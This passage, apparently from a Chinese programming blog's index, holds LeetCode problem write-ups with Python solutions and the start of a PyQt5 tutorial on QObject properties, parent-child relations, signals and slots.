0\n输出: 0\n```\n\n示例 5:\n\n```\n输入: nums = [1], target = 0\n输出: 0\n```\n\n\n提示:\n\n- 1 <= nums.length <= 104\n- -104 <= nums[i] <= 104\n- nums 为无重复元素的升序排列数组\n- -104 <= target <= 104\n\n#### 解答\n\n```python\nclass Solution:\n    def searchInsert(self, nums: List[int], target: int) -> int:\n        left, right = 0, len(nums)- 1\n        while left <= right:\n            mid = left + ((right - left) >> 1)\n            if nums[mid] == target:\n                return mid\n            elif target < nums[mid]:\n                right = mid -1\n            else:\n                left = mid + 1\n        return  left\n```\n\n## 双指针\n\n### 977.有序数组的平方\n\n#### 题目\n\n给你一个按 非递减顺序 排序的整数数组 nums，返回 每个数字的平方 组成的新数组，要求也按 非递减顺序排序。\n\n示例 1：\n\n```\n输入：nums = [-4,-1,0,3,10]\n输出：[0,1,9,16,100]\n解释：平方后，数组变为 [16,1,0,9,100]\n排序后，数组变为 [0,1,9,16,100]\n```\n\n示例 2：\n\n```\n输入：nums = [-7,-3,2,3,11]\n输出：[4,9,9,49,121]\n```\n\n\n提示：\n\n- 1 <= nums.length <= 104\n- -104 <= nums[i] <= 104\n- nums 已按 非递减顺序 排序\n\n\n进阶：\n\n请你设计时间复杂度为 O(n) 的算法解决本问题\n\n#### 解答\n\n方法一：直接排序\n\n```python\nclass Solution:\n    def sortedSquares(self, nums: List[int]) -> List[int]:\n        return sorted(pow(num,2) for num in nu\n```\n\n方法二：双指针\n\n方法一没有利用「数组 nums 已经按照升序排序」这个条件。\n\n如果数组 nums  中的所有数都是非负数，那么将每个数平方后，数组仍然保持升序；如果数组 nums 中的所有数都是负数，那么将每个数平方后，数组会保持降序。那么数组平方的最大值就在数组的两端，不是最左边就是最右边，不可能是中间。\n\n此时可以考虑双指针法了，i 指向起始位置，j 指向终止位置。\n\n定义一个新列表 res，和 nums 列表一样的大小，让 k 指向 res 终止位置。\n\n如果`nums[i] * nums[i] < nums[j] * nums[j]` 那么 `result[k--] = A[j] * A[j]`\n\n如果 `nums[i] * nums[i] >= nums[j] * nums[j]` 那么`result[k--] = A[i] * A[i]`\n\n![算法图解](https://img.jwt1399.top//img/20210729224442.gif)\n\n```python\nclass Solution:\n    def sortedSquares(self, nums: List[int]) -> List[int]:\n        i, j, k = 0, len(nums)-1, len(nums)-1\n        res = [-1] * len(nums)\n        while i <= j:\n            if nums[i] * nums[i] > nums[j] * nums[j]:\n                res[k] = nums[i] * nums[i]\n                i += 1\n            else:\n                res[k] = nums[j] * nums[j]\n                j -= 1\n            k -= 1\n        return res\n```\n\n### 189. 旋转数组\n\n#### 题目\n\n给定一个数组，将数组中的元素向右移动 `k` 个位置，其中 `k` 是非负数。\n\n**进阶：**\n\n- 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。\n- 你可以使用空间复杂度为 O(1) 的 **原地** 算法解决这个问题吗？\n\n**示例 1:**\n\n```\n输入: nums = [1,2,3,4,5,6,7], k = 3\n输出: [5,6,7,1,2,3,4]\n解释:\n向右旋转 1 步: [7,1,2,3,4,5,6]\n向右旋转 2 步: [6,7,1,2,3,4,5]\n向右旋转 3 步: [5,6,7,1,2,3,4]\n```\n\n**示例 2:**\n\n```\n输入：nums = [-1,-100,3,99], k = 2\n输出：[3,99,-1,-100]\n解释: \n向右旋转 1 步: [99,-1,-100,3]\n向右旋转 2 步: [3,99,-1,-100]\n```\n\n**提示：**\n\n- `1 <= nums.length <= 2 * 104`\n- `-231 <= nums[i] <= 231 - 1`\n- `0 <= k <= 105`\n\n#### 解答\n\n我们可以新建一个列表将每个元素放至正确的位置。首先遍历原列表，将原列表下标为 i 的元素放至新数组下标为  (i+k) mod n 的位置，因为没有返回值，所以题目验证的还是原列表，因此最后将新数组拷贝至原数组即可。\n\n```python\nclass Solution:\n    def rotate(self, nums: List[int], k: int) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        res = [-1] * len(nums)\n        for i in range(len(nums)):\n            res[(i+k)%len(nums)] = nums[i]\n        for i in range(len(nums)):\n            nums[i] = res[i]\n```\n\n### 283. 移动零\n\n### 题目\n\n给定一个数组 `nums`，编写一个函数将所有 `0` 移动到数组的末尾，同时保持非零元素的相对顺序。\n\n**示例:**\n\n```\n输入: [0,1,0,3,12]\n输出: [1,3,12,0,0]\n```\n\n**说明**:\n\n1. 必须在原数组上操作，不能拷贝额外的数组。\n2. 尽量减少操作次数。\n\n#### 解答\n\n方法一：\n\n给定一个数组，我们需要做的就是将非零的数字移到数组的前面，将0移到数组的末尾，同时不能使用额外的空间。首先使用两个指针，第一个指针 j 从前往后遍历所有的数字，第二个指针 i 指在数组中 0 所在的位置，当 j 遇到非 0 的数字时，我们就交换 num[i] 和 nums[j] 的值。\n\n![图解](https://img.jwt1399.top//img/20210730210745.png)\n\n```python\nclass Solution:\n    def moveZeroes(self, nums: List[int]) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        i = -1\n        for j in range(len(nums)):\n            if nums[j]!=0:\n                i+=1\n                nums[i],nums[j]= nums[j], nums[i]      \n                \n```\n\n方法二：\n\n右指针不断向右移动，每次右指针指向非零数，则将左右指针对应的数交换，同时左指针右移。因此每次交换，都是将左指针的零与右指针的非零数交换，且非零数的相对顺序并未改变。最终左指针左边均为非零数；右指针左边直到左指针处均为零。\n\n```python\nclass Solution:\n    def moveZeroes(self, nums: List[int]) -> None:\n        \"\"\"\n        Do not return anything, modify nums in-place instead.\n        \"\"\"\n        n = len(nums)\n        left = right = 0\n        while right < n:\n            if nums[right] != 0:\n                nums[left], nums[right] = nums[right], nums[left]\n                left += 1\n            right += 1\n```\n\n### 167. 两数之和 II - 输入有序数组\n\n#### 题目\n\n给定一个已按照 **升序排列** 的整数数组 `numbers` ，请你从数组中找出两个数满足相加之和等于目标数 `target` 。\n\n函数应该以长度为 `2` 的整数数组的形式返回这两个数的下标值*。*`numbers` 的下标 **从 1 开始计数** ，所以答案数组应当满足 `1 <= answer[0] < answer[1] <= numbers.length` 。\n\n你可以假设每个输入只对应唯一的答案，而且你不可以重复使用相同的元素。\n\n**示例 1：**\n\n```\n输入：numbers = [2,7,11,15], target = 9\n输出：[1,2]\n解释：2 与 7 之和等于目标数 9 。因此 index1 = 1, index2 = 2 。\n```\n\n**示例 2：**\n\n```\n输入：numbers = [2,3,4], target = 6\n输出：[1,3]\n```\n\n**示例 3：**\n\n```\n输入：numbers = [-1,0], target = -1\n输出：[1,2]\n```\n\n**提示：**\n\n- `2 <= numbers.length <= 3 * 104`\n- `-1000 <= numbers[i] <= 1000`\n- `numbers` 按 **递增顺序** 排列\n- `-1000 <= target <= 1000`\n- 仅存在一个有效答案\n\n#### 解答\n\n初始状态下，令 left 指向第一个元素，right 指向最后一个元素，进入循环，控制循环的退出条件为 left >= right ,在每一次循环中如果 left 与 right 数字之和等于 target ,则返回当前的 left,right；若 left 与 right 数字之和小于 target ，left += 1，继续循环；若 left 与 right 数字之和大于 target ，right -= 1，继续循环；\n\n```python\nclass Solution:\n    def twoSum(self, numbers: List[int], target: int) -> List[int]:   \n        left, right = 0, len(numbers) - 1\n        while left < right:\n            if numbers[left] + numbers[right] == target:\n                return [left+1,right+1]\n            elif numbers[left] + numbers[right] < target:\n                left += 1\n            else:\n                right -= 1\n        return [-1,-1]\n```\n\n### 复杂度\n\n- 时间复杂度：$\\mathcal{O}(n)$​​​​\n- 空间复杂度：$\\mathcal{O}(1)$​。\n\n### 344. 反转字符串\n\n#### 题目\n\n编写一个函数，其作用是将输入的字符串反转过来。输入字符串以字符数组 `char[]` 的形式给出。\n\n不要给另外的数组分配额外的空间，你必须原地修改输入数组、使用 O(1) 的额外空间解决这一问题。\n\n你可以假设数组中的所有字符都是 ASCII 码表中的可打印字符。\n\n**示例 1：**\n\n```\n输入：[\"h\",\"e\",\"l\",\"l\",\"o\"]\n输出：[\"o\",\"l\",\"l\",\"e\",\"h\"]\n```\n\n**示例 2：**\n\n```\n输入：[\"H\",\"a\",\"n\",\"n\",\"a\",\"h\"]\n输出：[\"h\",\"a\",\"n\",\"n\",\"a\",\"H\"]\n```\n\n#### 解答\n\n方法一：双指针\n\n```python\nclass Solution:\n    def reverseString(self, s: List[str]) -> None:\n        \"\"\"\n        Do not return anything, modify s in-place instead.\n        \"\"\"\n        left, right =0, len(s)-1\n        while left <= right:\n            s[left],s[right] = s[right],s[left]\n            left += 1\n            right -= 1\n```\n\n方法二：库函数\n\n- `s[::-1]` 表示反转 s 中的元素\n- `s[:]`  表示数组中所有元素\n- `s[:]=s[::-1]` 表示将原数组反转后赋值给 s 中每一个对应的位置\n- `s=s[::-1]` 表示将 s 反转后赋值给新的对象 s（可以通过id函数查看内存地址），与题意原地修改不符。\n\n```python\nclass Solution:\n    def reverseString(self, s: List[str]) -> None:\n        \"\"\"\n        Do not return anything, modify s in-place instead.\n        \"\"\"\n        s[:]=s[::-1]\n```\n\n### 557. 反转字符串中的单词 III\n\n#### 题目\n\n给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。\n\n**示例：**\n\n```\n输入：\"Let's take LeetCode contest\"\n输出：\"s'teL ekat edoCteeL tsetnoc\"\n```\n\n**提示：**\n\n- 在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。\n\n#### 解答\n\n方法一：将字符串分割成单词列表，然后把每个单词反转再拼接\n\n```python\nclass Solution(object):\n    def reverseWords(self, s):\n        return \" \".join(word[::-1] for word in s.split(\" \"))\n```\n\n- `s.split(\" \")` 以空格为分隔符将字符串分割成单词列表\n\n- `[::-1]`   \t\t     将单词反转\n- `\" \".join()`     将单词列表转换为字符串，以空格分隔\n\n方法二：利用两次切片，不需遍历\n\n```python\nclass Solution(object):\n    def reverseWords(self, s):\n        return \" \".join(s.split(\" \")[::-1])[::-1]\n```\n\n以字符串 “I love drag queen” 为例：\n\n- s.split(\" \") 将字符串分割成单词列表:\n\n```\n['I', 'love', 'drag', 'queen']\n```\n\n- s.split(\" \")[::-1] 将单词列表反转:\n\n```\n['queen', 'drag', 'love', 'I']\n```\n\n- \" \".join(s.split(\" \")[::-1]) 将单词列表转换为字符串，以空格分隔:\n\n```\n\"queen drag love I\"\n```\n\n- \" \".join(s.split(\" \")[::-1])[::-1] 将字符串反转：\n\n```\n”I evol gard neeuq“\n```\n\n## 链表\n\n### 876. 链表的中间结点\n\n#### 题目\n\n给定一个头结点为 `head` 的非空单链表，返回链表的中间结点。如果有两个中间结点，则返回第二个中间结点。\n\n**示例 1：**\n\n```\n输入：[1,2,3,4,5]\n输出：此列表中的结点 3 (序列化形式：[3,4,5])\n返回的结点值为 3 。 (测评系统对该结点序列化表述是 [3,4,5])。\n注意，我们返回了一个 ListNode 类型的对象 ans，这样：\nans.val = 3, ans.next.val = 4, ans.next.next.val = 5, 以及 ans.next.next.next = NULL.\n```\n\n**示例 2：**\n\n```\n输入：[1,2,3,4,5,6]\n输出：此列表中的结点 4 (序列化形式：[4,5,6])\n由于该列表有两个中间结点，值分别为 3 和 4，我们返回第二个结点。\n```\n\n**提示：**\n\n- 给定链表的结点数介于 `1` 和 `100` 之间。\n\n#### 解答\n\n用两个指针 `slow` 与 `fast` 一起遍历链表。`slow` 一次走一步，`fast` 一次走两步。那么当 `fast` 到达链表的末尾时，`slow` 必然位于中间。快指针可以前进的条件是当前快指针下一个节点和下下个节点都非空。\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def middleNode(self, head: ListNode) -> ListNode:\n        slow = fast = head \n        while fast and fast.next:\n            slow = slow.next\n            fast = fast.next.next\n        return slow\n```\n\n### 19. 删除链表的倒数第 N 个结点\n\n#### 题目\n\n给你一个链表，删除链表的倒数第 `n` 个结点，并且返回链表的头结点。\n\n**进阶：**你能尝试使用一趟扫描实现吗？\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/10/03/remove_ex1.jpg)\n\n```\n输入：head = [1,2,3,4,5], n = 2\n输出：[1,2,3,5]\n```\n\n**示例 2：**\n\n```\n输入：head = [1], n = 1\n输出：[]\n```\n\n**示例 3：**\n\n```\n输入：head = [1,2], n = 1\n输出：[1]\n```\n\n**提示：**\n\n- 链表中结点的数目为 `sz`\n- `1 <= sz <= 30`\n- `0 <= Node.val <= 100`\n- `1 <= n <= sz`\n\n#### 解答\n\n方法一：循环迭代-- 找到 length -n 个节点\n\n先从头节点开始对链表进行一次遍历，得到链表的长度 L。随后我们再从头节点开始对链表进行一次遍历，当遍历到第 L-n 个节点时，它就是我们需要删除的节点。\n\n删除的方法是：找到被删除节点的前置节点，然后将前置节点的 next 指针指向该节点的后置节点。\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:\n        dummy = ListNode(0, head) #定义哑节点，放在头节点前面\n        \n        #step1: 获取链表长度\n        cur, length = head, 0 \n        while cur:\n            length += 1\n            cur = cur.next \n        \n        #step2: 找到倒数第N个节点的前面一个节点\n        cur = dummy\n        for i in range(length - n):\n            cur = cur.next\n        \n        #step3: 删除节点，并重新连接\n        cur.next = cur.next.next\n        return dummy.next \n```\n\n方法二：快慢指针 -- 找倒数第N个节点的前一个节点\n\n设定双指针 slow 和 fast ，当 fast 指向末尾的 NULL，slow  与 fast 之间相隔的元素个数为 n 时，那么删除掉 slow  的下一个指针就完成了要求。\n\n- 设置虚拟节点 dummy 指向 head\n- 设定双指针 slow  和 fast，初始都指向虚拟节点 dummy\n- 移动 fast，直到 slow 与 fast 之间相隔的元素个数为 n\n- 再同时移动 slow  与 fast ，直到 fast  指向的为 NULL\n- 将 slow 的下一个节点指向下下个节点\n\n![](https://pic.leetcode-cn.com/cc43daa8cbb755373ce4c5cd10c44066dc770a34a6d2913a52f8047cbf5e6e56-file_1559548337458)\n\n```python\n# Definition for singly-linked list.\n# class ListNode:\n#     def __init__(self, val=0, next=None):\n#         self.val = val\n#         self.next = next\nclass Solution:\n    def removeNthFromEnd(self, head: ListNode, n: int) -> ListNode:\n        dummy = ListNode(0, head) #定义哑节点，放在头节点前面\n        \n        #step1: 快指针先走n步\n        slow, fast = dummy, dummy\n        for i in range(n):\n            fast = fast.next \n\n        #step2: 快慢指针同时走，直到fast指针到达尾部节点，此时slow到达倒数第N个节点的前一个节点\n        while fast and fast.next:\n            slow, fast = slow.next, fast.next \n        \n        #step3: 删除节点，并重新连接\n        slow.next = slow.next.next \n        return dummy.next \n```\n\n###\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"🔔请输入文章查看码，看更多内容\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n\n# 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["算法"],"categories":["Python"]},{"title":"Python：PyQt学习","url":"/posts/41724.html","content":"\n> PyQt是一个用于创建GUI应用程序的跨平台工具包，它将Python与Qt库融为一体。PyQt允许使用Python语言调用Qt库中的API。这样做的最大好处就是在保留了Qt高运行效率的同时，大大提高了开发效率。\n\n# 基础\n\n## 第一个 PyQt 程序\n\n### 安装PyQt5\n\n```shell\npip install pyqt5-tools\n```\n\n即可同时安装 PyQt5 和一些重要的工具，比如 Qt designer。\n\n### 基础代码\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\n#from PyQt5.Qt import *   # 导入所有包\nimport sys\n\n#创建应用程序对象\napp = QApplication(sys.argv)\n# 创建控件\nwindow = QMainWindow()\n# 设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('第一个窗口')\n# 展示控件\nwindow.show()\nsys.exit(app.exec_())\n```\n\n### 封装到类中\n\n上面的代码把控件对应的变量名全部作为全局变量。如果要设计稍微复杂一些的程序，就会出现太多的控件对应的变量名。而且这样也不利于代码的模块化。所以，我们通常应该把 一个窗口和其包含的控件，对应的代码全部封装到类中，如下所示：\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\n\nclass Window():\n    def __init__(self):\n        self.window = QMainWindow()\n        self.window.resize(500, 400)\n        self.window.move(300, 300)\n        self.window.setWindowTitle('第一个窗口')\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    stats = Window()\n    stats.window.show()\n    sys.exit(app.exec_())\n```\n\n`if __name__ == '__main__':` 作用：python文件通常有两种使用方法，第一是作为脚本直接执行，第二是 import 到其他的 python 脚本中被调用（模块重用）执行。因此 `if __name__ == 'main':` 的作用就是控制这两种情况执行代码的过程，在 `if __name__ == 'main':` 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而 import 到其他脚本中是不会被执行的，因此可以在`if __name__ == 'main':`下放这个Python 文件的测试代码，即 import 到其他的 python 脚本中不会被执行的代码 。\n\n### 面向对象版本\n\n> 面向对象就是在编程的时候尽可能的去模拟真实的现实世界，按照现实世界中的逻辑去处理一个问题，分析问题中参与其中的有哪些实体，这些实体应该有什么属性和方法，我们如何通过调用这些实体的属性和方法去解决问题。\n>\n> 面向过程就是面向解决问题的过程进行编程。是一种以事件为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow,QLabel\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('第一个窗口')\n        self.setup_ui()\n\n    def setup_ui(self):\n        label = QLabel(self)\n        label.setText(\"这是一个标签\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n## PyCharm 使用技巧\n\n### PyCharm 设置活动模板设置\n\n> 活动模板：很简单的一个示例，就是在 PyCharm 中输入 main 关键字，会自动带出一些默认的代码，这个就是活动模板配置\n\nPycharm 中 File -》Settings --> Editor  --> Live Templates --> Python -->右上角“+”号\n\n![](https://img.jwt1399.top//img/20210723175526.png)\n\n### Pycharm 设置代码作者信息\n\nPycharm 中 File --> Settings --> Editor  --> File and Code Templates--> Python Script\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n# @Project  :${PROJECT_NAME}\n# @File     :${NAME}\n# @Date     :${DATE} ${TIME}\n# @Author   :作者名\n# @Software :${PRODUCT_NAME}\n-------------------------------------------------\n\"\"\"\n```\n\n## 查看继承关系\n\n1、Ctrl+鼠标左键，点入到内置文件中，翻到类名处查看\n\n2、 通过保留属性`__base__`，返回的是直接继承关系\n\n```python\nprint(QWidget.__bases__) # 返回结果是元组\n```\n\n3、使用 `mro()` ，返回整个继承链条！\n\n```python\nprint(QObject.mro()) # 返回结果是列表\n```\n\n# 控件学习\n\n## QObject\n\n> QObject 所有 Qt 对象的基类\n\n### 对象名称和属性\n\n#### API\n\n- setObjectName(\"unique name\")     设置对像名称\n- objectName()   获取Qt对象的名称\n- setProperty(\"name\", \"value\") 设置对像属性\n- property(\"name\")  获取对象的属性值\n- dynamicPropertyNames()  获取对象中所有通过setProperty()设置的属性名称\n\n**API测试：**\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObject的学习\")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self):\n        obj = QObject()\n        obj.setObjectName(\"jianjian\")\n        print(obj.objectName()) \n        obj.setProperty(\"notice_level\", \"error\")\n        obj.setProperty(\"notice_level2\", \"warning\")\n        print(obj.property(\"notice_level\"))\n        print(obj.dynamicPropertyNames())\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n输出：\n\n```python\n1 jianjian\n2 error\n3 [PyQt5.QtCore.QByteArray(b'notice_level'), PyQt5.QtCore.QByteArray(b'notice_level2')]\n```\n\n#### 应用场景\n\n- 用于qss的ID选择器，属性选择器，方便统一设置样式\n\nQObejct.qss\n\n```css\nQLabel#notice {\n    font-size :20px;\n    color :green;\n    border:1px solid gray;\n    border-radius:8px;\n}\nQLabel#notice[notice_level = \"warning\"] {\n    color :yellow;\n    border-color:yellow;\n}\nQLabel#notice[notice_level = \"error\"] {\n    color :red;\n    border-color:red;\n}\n```\n\ntest.py\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObject的学习\")\n        self.resize(300, 300)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self): # 读取QObject.qss\n        with open(\"QObject.qss\", \"r\") as f:\n            qApp.setStyleSheet(f.read())\n\n        label = QLabel(self)\n        label.setText(\"标签1\")\n        label.setObjectName(\"notice\")\n\n        label2 = QLabel(self)\n        label2.setText(\"标签2\")\n        label2.move(100, 100)\n        label2.setObjectName(\"notice\")\n        label2.setProperty(\"notice_level\", \"warning\")\n\n        label3 = QLabel(self)\n        label3.setText(\"标签3\")\n        label3.move(200, 200)\n        label3.setObjectName(\"notice\")\n        label3.setProperty(\"notice_level\",\"error\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n![](https://img.jwt1399.top//img/20210724172408.png)\n\n### 父子关系操作\n\n#### API\n\n- setParent(parent) 设置父对象，父对象只能设置一个\n- parent() 获取父对象\n- children() 获取所有直接子对象\n- findChild(参数1,参数2,参数3) 获取某一个指定类型和名称的子对象\n  - 参数1：\n    - 类型 QObject\n    - 类型元组 (QPushButton, QLabel)\n  - 参数2：对象名称\n  - 参数3：查找选项\n    - Qt.FindChildrenRecursively 递归查找(默认选项)\n    - Qt.FindDirectChildrenOnly   只查找直接子对象\n- findChildren(参数1,参数2,参数3) 获取某一个指定名称所有子对象，参数同上\n\n **API测试：构造如下父子图**\n\n![](https://img.jwt1399.top//img/20210726085600.png)\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('父子对象')\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self):\n        obj0 = QObject()\n        obj1 = QObject()\n        obj2 = QObject()\n        obj3 = QObject()\n        obj4 = QObject()\n        obj5 = QObject()\n\n        # 打印各个对象变量  也可print('obj0:', obj0)\n        for i in range(6):\n            name = \"obj\" + str(i)\n            print(name,eval(name))\n\n        #设置父对象\n        obj1.setParent(obj0)\n        obj2.setParent(obj0)\n        obj3.setParent(obj1)\n        obj4.setParent(obj2)\n        obj5.setParent(obj2)\n\n        # 设置对象名称\n        obj2.setObjectName(\"2\")\n        obj3.setObjectName(\"3\")\n        \n        # API测试结果\n        print('obj0父对象：', obj0.parent())\n        print('obj0所有直接子对象：', obj0.children())\n        print('obj0的第一个子对象：', obj0.findChild(QObject))\n        print('obj0的第二个子对象：', obj0.findChild(QObject,\"2\"))\n        print('obj0的第三个子对象(孙子)：', obj0.findChild(QObject, \"3\", Qt.FindChildrenRecursively)) #递归（默认选项，可不写）\n        print('obj0的第三个子对象(孙子)：', obj0.findChild(QObject, \"3\", Qt.FindDirectChildrenOnly))  #只查找直接子对象\n        print('obj0的所有子对象：', obj0.findChildren(QObject))\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n输出：\n\n```python\nobj0 <PyQt5.QtCore.QObject object at 0x000002749F7F33A8>\nobj1 <PyQt5.QtCore.QObject object at 0x000002749F7F3438>\nobj2 <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>\nobj3 <PyQt5.QtCore.QObject object at 0x000002749F7F3558>\nobj4 <PyQt5.QtCore.QObject object at 0x000002749F7F35E8>\nobj5 <PyQt5.QtCore.QObject object at 0x000002749F7F3678>\nobj0父对象： None\nobj0所有直接子对象： [<PyQt5.QtCore.QObject object at 0x000002749F7F3438>, <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>]\nobj0的第一个子对象： <PyQt5.QtCore.QObject object at 0x000002749F7F3438>\nobj0的第二个子对象： <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>\nobj0的第三个子对象(孙子)： <PyQt5.QtCore.QObject object at 0x000002749F7F3558>\nobj0的第三个子对象(孙子)： None\nobj0的所有子对象： [<PyQt5.QtCore.QObject object at 0x000002749F7F3438>, <PyQt5.QtCore.QObject object at 0x000002749F7F3558>, <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>, <PyQt5.QtCore.QObject object at 0x000002749F7F35E8>, <PyQt5.QtCore.QObject object at 0x000002749F7F3678>]\n\n```\n\n#### 应用场景\n\n- 内存管理机制-当父对象销毁的时候，子对象也会被销毁。\n\n- 如果一个控件，没有任何父控件。那么就会被当或顶层控件(窗口)。\n- 如果相要一个控件被包含在另外一个控件内部．就需要设置父子关系。\n\n### 信号与槽机制\n\n#### API\n\n- widget.信号.connect(槽)     连接信号与槽\n- widget.信号.disconnect()     取消连接信号与槽\n- widget.blockSignals(bool)   临时（取消）阻止指定控件所有的信号与槽的连接\n- widget.signalsBlocked()       信号是否被阻止\n- widget.receivers(信号)         返回连接到信号的接收器数量(槽的数量)\n\n#### 应用场景\n\n**监听信号, 响应用户行为**\n\n案例一：点击按钮显示内容\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('信号与槽')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_signal_test()\n\n    def QObject_signal_test(self):\n        btn = QPushButton(self)\n        btn.setText(\"点我呀\")\n\n        def clicked_slot(self):\n            print(\"点我干啥\")\n\n        btn.clicked.connect(clicked_slot)\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n案例二：在所有修改的窗口标题前, 添加前缀\"简简-\"\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('信号与槽')\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # 创建应用程序对象\n    window = Window()\n\n    def windowTitleChanged_slot(arg):\n        print(\"修改的标题是：\",arg)    # arg为windowTitleChanged传回的参数\n        window.blockSignals(True)   # 临时阻塞信号，不阻断将会陷入死循环\n        print(\"信号是否阻断：\",window.signalsBlocked())\n        window.setWindowTitle(\"简简-\"+ arg)\n        window.blockSignals(False)  # 再次开启信号的连接,不开启的话只能成功添加一次前缀\n        print(\"信号是否阻断：\", window.signalsBlocked())\n\n    window.windowTitleChanged.connect(windowTitleChanged_slot) # 连接信号和槽\n    window.setWindowTitle(\"测试\")\n    window.setWindowTitle(\"测试2\")\n    print(\"信号有{}个槽函数\".format(window.receivers(window.windowTitleChanged)))\n    window.windowTitleChanged.disconnect()  # 取消信号和槽之间的联系\n    window.setWindowTitle(\"测试3\")\n    print(\"信号有{}个槽函数\".format(window.receivers(window.windowTitleChanged)))\n\n    window.show() # 展示控件\n    sys.exit(app.exec_())\n```\n\n输出：\n\n```python\n修改的标题是： 测试\n信号是否阻断： True\n信号是否阻断： False\n修改的标题是： 测试2\n信号是否阻断： True\n信号是否阻断： False\n信号有1个槽函数\n信号有0个槽函数\n```\n\n### 类型判定\n\n#### API\n\n- isWidgetType()  是否是控件类型\n- inherits(父类)    一个对象是否继承（直接或者间接）自某个类\n\n**API测试：**\n\n```python\nfrom PyQt5.Qt import *  # 刚开始学习可以这样一下导入\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # 继承父类的init方法\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('类型判定')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_type_judge()\n\n    def QObject_type_judge(self):\n        obj = QObject()\n        w = QWidget()\n        btn = QPushButton()\n        label = QLabel()\n        list = [obj, w, btn, label]\n        print(\"isWidgetType测试\")\n        for i in list:\n            print(\"是否是控件类型:\", i.isWidgetType())\n        print(\"inherits测试\")\n        for i in list:\n            print(\"是否继承自QWidget:\", i.inherits(\"QWidget\"))\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # 创建应用程序对象\n    window = Window()\n    window.show() # 展示控件\n    sys.exit(app.exec_())\n\n```\n\n输出：\n\n```python\nisWidgetType测试\n是否是控件类型: False\n是否是控件类型: True\n是否是控件类型: True\n是否是控件类型: True\ninherits测试\n是否继承自QWidget: False\n是否继承自QWidget: True\n是否继承自QWidget: True\n是否继承自QWidget: True\n```\n\n#### 